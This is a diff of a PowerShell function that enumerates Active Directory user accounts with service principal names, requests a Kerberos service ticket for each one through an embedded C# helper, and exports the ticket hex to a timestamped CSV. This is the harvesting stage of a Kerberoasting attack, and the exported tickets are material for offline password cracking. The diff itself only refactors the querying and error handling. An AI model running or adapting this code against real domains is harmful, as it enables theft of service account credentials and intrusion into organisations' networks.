@@ -121,47 +121,38 @@ public class K {
 "@
 
 function Get-KerberosTicketsForAllSPNs {
-    param (
+    param(
         [switch] $ExportToCsv
     )
 
-    Write-Host "`nRequesting TGS for SPNs:`n" -ForegroundColor Cyan
+    Write-Host "`nRequesting TGS for SPNs:`n"
 
-    # Get all user and computer accounts with SPNs
-    $accounts = @()
-    try {
-        $accounts += Get-ADUser -Filter { ServicePrincipalName -like "*" } -Properties ServicePrincipalName
-    } catch { Write-Warning "Failed to query users with SPNs: $_" }
+    $users = Get-ADUser -Filter { ServicePrincipalName -like "*" } -Properties ServicePrincipalName
+    $results = @()
 
-    try {
-        $accounts += Get-ADComputer -Filter { ServicePrincipalName -like "*" } -Properties ServicePrincipalName
-    } catch { Write-Warning "Failed to query computers with SPNs: $_" }
+    foreach ($user in $users) {
+        foreach ($spn in $user.ServicePrincipalName) {
+            Write-Host "  → $spn"
 
-    $results = foreach ($acct in $accounts) {
-        foreach ($spn in $acct.ServicePrincipalName) {
-            Write-Host " -> $spn"
-            $ticket = ""
             try {
                 $ticket = [K]::GetTicket($spn)
+                $results += [PSCustomObject]@{
+                    SamAccountName = $user.SamAccountName
+                    SPN            = $spn
+                    TicketHex      = $ticket
+                }
             } catch {
-                Write-Warning ("Failed to request ticket for $spn: " + $_)
-            }
-
-            [pscustomobject]@{
-                Name        = $acct.Name
-                SamAccount  = $acct.SamAccountName
-                ObjectClass = $acct.objectClass
-                SPN         = $spn
-                TicketHex   = $ticket
+                Write-Warning ("Failed to request ticket for $spn: $($_)")
             }
         }
     }
 
     if ($ExportToCsv) {
         $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
-        $results | Export-Csv "Kerberos_Tickets_$timestamp.csv" -NoTypeInformation
-        Write-Host "`nSaved tickets to Kerberos_Tickets_$timestamp.csv" -ForegroundColor Green
+        $path = "KerberosTickets_$timestamp.csv"
+        $results | Export-Csv -Path $path -NoTypeInformation -Encoding UTF8
+        Write-Host "`nResults exported to: $path"
     } else {
-        return $results
+        $results
     }
 }
